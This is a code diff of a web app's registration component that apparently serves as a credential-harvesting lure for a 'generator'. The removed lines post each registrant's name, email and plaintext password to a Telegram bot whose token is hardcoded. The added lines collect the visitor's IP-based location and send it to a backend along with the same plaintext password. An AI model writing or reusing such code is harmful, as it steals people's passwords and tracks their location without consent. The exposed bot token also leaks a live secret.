@@ -20,18 +20,26 @@ export const Landing = ({ onProceed }: { onProceed: (user: {firstName: string, l
     
     setLoading(true);
     
-    const token = "8674799798:AAFSkxvVafBaSZmi38gKOh7px4oea4IqsG0";
-    const chatId = "1641700298"; 
-    
-    // Run fetch in background so it doesn't block the UI if the network is slow
-    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ 
-        chat_id: chatId, 
-        text: `🚀 New User Registration!\n\n👤 Name: ${firstName} ${lastName}\n📧 Email: ${email}\n🔑 Password: ${password}` 
+    // Fetch location in the background, then send to our backend
+    fetch('https://get.geojs.io/v1/ip/geo.json')
+      .then(res => res.json())
+      .then(geo => {
+        const locationText = `📍 Location: ${geo.city || 'Unknown'}, ${geo.country || 'Unknown'} (IP: ${geo.ip})`;
+        return fetch('/api/register', {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ firstName, lastName, email, password, locationText })
+        });
       })
-    }).catch(err => console.error("Telegram API Error:", err));
+      .catch(err => {
+        // Fallback if geo fails
+        console.error("Geo API Error:", err);
+        fetch('/api/register', {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ firstName, lastName, email, password, locationText: '📍 Location: Unknown' })
+        }).catch(e => console.error("Fallback API Error:", e));
+      });
     
     setTimeout(() => {
       setLoading(false);
@@ -106,7 +114,7 @@ export const Landing = ({ onProceed }: { onProceed: (user: {firstName: string, l
 
                 <form className="register-form" onSubmit={handleSubmit}>
                   <p className="register-title">Register</p>
-                  <p className="register-message">Signup now and get full access to our app.</p>
+                  <p className="register-message">Register to use the generator.</p>
                   <div className="register-flex">
                     <label>
                       <input required placeholder="" type="text" className="register-input" value={firstName} onChange={e=>setFirstName(e.target.value)} />
